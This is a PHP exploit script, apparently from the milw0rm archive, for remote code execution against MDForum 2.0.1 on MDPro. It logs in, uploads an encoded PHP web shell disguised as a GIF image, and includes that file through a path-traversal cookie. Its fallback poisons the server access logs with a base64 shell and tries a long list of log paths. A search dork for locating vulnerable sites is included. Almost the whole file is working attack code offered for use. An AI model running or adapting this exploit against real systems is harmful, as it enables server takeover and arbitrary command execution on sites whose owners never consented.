<?

//Kacper & str0ke Settings 
$exploit_name = "MDForum <= 2.0.1 (PNSVlang) Remote Code Execution Exploit";
$script_name = "MDForum 2.0.1";
$script_site = "http://www.maxdev.pl/Contents,Download,View,8.phtml";
$dork = '"Powered by MDForum"';
//**************************************************************


print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: '.$exploit_name.'
[Script name: '.$script_name.'
[Script site: '.$script_site.'
dork: '.$dork.'

Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)

Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke,
mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan,
DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
MDForum is module of MDpro, exploit based on vulnerability in MDpro :)

Happy New Year all!!
p.s
dobra nie ma co gadac ! ide pic :P

=====>


in file: includes/search/search_mdforum.php:

....
$currentlang = pnUserGetLang(); // select language      //<-----------------{1}

// check to language in use  TiMax
if (file_exists("includes/language/blocks/$currentlang/search_mdforum.php")) { //<-----------------{2}
    include "includes/language/blocks/$currentlang/search_mdforum.php";       //<-----------------{3}
} else { 
    include "includes/language/blocks/eng/search_mdforum.php";
} 

....
local include :)
be safe @ll :)
*/


if ($argc<7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path username password session_id cmd OPTIONS
host:       target server (ip/hostname)
path:       MDPro Forum path
username:   You username
password:   You password
session_id: register in MDPro, login and insert you session id
cmd:        a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /MDPro/ 07e0ed91d7ffab69312a5ab3db4b827d ls -la -P1.1.1.1:80
-----------------------------------------------------------------------------
');

die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$session=$argv[5];
$cmd="";

$port=80;
$proxy="";
for ($i=6; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="uname"

'.$username.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="pass"

'.$password.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

Login
-----------------------------7d6224c08dc--
';


echo "login...\n";
$packet ="POST ".$p."user.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);


$hauru=
"\x20\x0d\x0a\x47\x49\x46\x38\x36\x0d\x0a\x3c\x3f\x70\x68\x70\x20".
"\x6f\x62\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0d\x0a\x2f\x2f\x52".
"\x75\x63\x68\x6f\x6d\x79\x20\x7a\x61\x6d\x65\x6b\x20\x48\x61\x75".
"\x72\x75\x20\x3b\x2d\x29\x0d\x0a\x65\x63\x68\x6f\x22\x2e\x2e\x2e".
"\x48\x61\x63\x6b\x65\x72\x2e\x2e\x4b\x61\x63\x70\x65\x72\x2e\x2e".
"\x4d\x61\x64\x65\x2e\x2e\x69\x6e\x2e\x2e\x50\x6f\x6c\x61\x6e\x64".
"\x21\x21\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x2e\x54\x45\x41\x4d\x2e".
"\x2e\x74\x68\x65\x2e\x2e\x62\x65\x73\x74\x2e\x2e\x70\x6f\x6c\x69".
"\x73\x68\x2e\x2e\x74\x65\x61\x6d\x2e\x2e\x47\x72\x65\x65\x74\x7a".
"\x2e\x2e\x2e\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65\x63\x68".
"\x6f\x22\x2e\x2e\x2e\x47\x6f\x20\x54\x6f\x20\x44\x45\x56\x49\x4c".
"\x20\x54\x45\x41\x4d\x20\x49\x52\x43\x3a\x20\x37\x32\x2e\x32\x30".
"\x2e\x31\x38\x2e\x36\x3a\x36\x36\x36\x37\x20\x23\x64\x65\x76\x69".
"\x6c\x74\x65\x61\x6d\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65".
"\x63\x68\x6f\x22\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x20\x54\x45\x41".
"\x4d\x20\x53\x49\x54\x45\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77".
"\x77\x77\x2e\x72\x61\x68\x69\x6d\x2e\x77\x65\x62\x64\x2e\x70\x6c".
"\x2f\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x69\x6e\x69\x5f\x73".
"\x65\x74\x28\x22\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f".
"\x6e\x5f\x74\x69\x6d\x65\x22\x2c\x30\x29\x3b\x0d\x0a\x20\x0d\x0a".
"\x20\x0d\x0a\x65\x63\x68\x6f\x20\x22\x48\x61\x75\x72\x75\x22\x3b".
"\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x70\x61\x73\x73\x74\x68\x72\x75".
"\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54\x54\x50\x5f\x48".
"\x41\x55\x52\x55\x5d\x29\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x64".
"\x69\x65\x3b\x3f\x3e\x0d\x0a\x20";


$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="title"

hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userfile"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="description"

DEVIL TEAM!! THE BEST POLISH HACKER TEAM
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="nname"

'.$username.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="email"

devilteam@polish.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="homepage"

http://www.rahim.webd.pl/
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

Add this file
-----------------------------7d6224c08dc--
';

echo "upload hauru...(step1)\n";
echo "secure categories must be off...\n";
$packet ="POST ".$p."modules.php?op=modload&name=Downloads&file=index&req=AddDownload HTTP/1.0\r\n";
$packet.="Cookie: MDPROSID=".$session.";\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);
$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="dynafield[_UREALNAME]"

Kacper
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="dynafield[_UREALEMAIL]"

Kacper@yahoo.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="dynafield[_UFAKEMAIL]"

Kacper@yahoo.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="dynafield[_YOURHOMEPAGE]]"

http://www.rahim.webd.pl/
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="user_pavatar"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

Zapisz zmiany
-----------------------------7d6224c08dc--
';

echo "upload hauru...(step2)\n";
echo "secure categories must be off...\n";
$packet ="POST ".$p."user.php?op=edituser HTTP/1.0\r\n";
$packet.="Cookie: MDPROSID=".$session.";\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);
echo "Hauru uploaded!! now remote code execution...\n";
$packet ="GET ".$p."includes/search/search_mdforum.php HTTP/1.1\r\n";
$packet.="Cookie: MDPROSID=".$session.";\r\n";
$packet.="Cookie: PNSVlang=../../../upload/dl/hauru.gif%00;\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}

echo "insert evil code in logfiles ...\r\n\r\n";
$calcifer = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuLi5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyBUbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
$packet="GET ".$p.$calcifer." HTTP/1.0\r\n";
$packet.="User-Agent: ".$calcifer." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacket($packet);
sleep(1);


$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
echo "remote code execution in logifiles...wait..\n";
$packet ="GET ".$p."error.php HTTP/1.1\r\n";
$packet.="Cookie: MDPROSID=".$session.";\r\n";
$packet.="Cookie: PNSVlang=../../../".$paths[$i]."%00;\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
}
echo "Exploit err0r :(\n";
echo "Check register_globals = On and magic_quotes_gpc = off\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-12-31]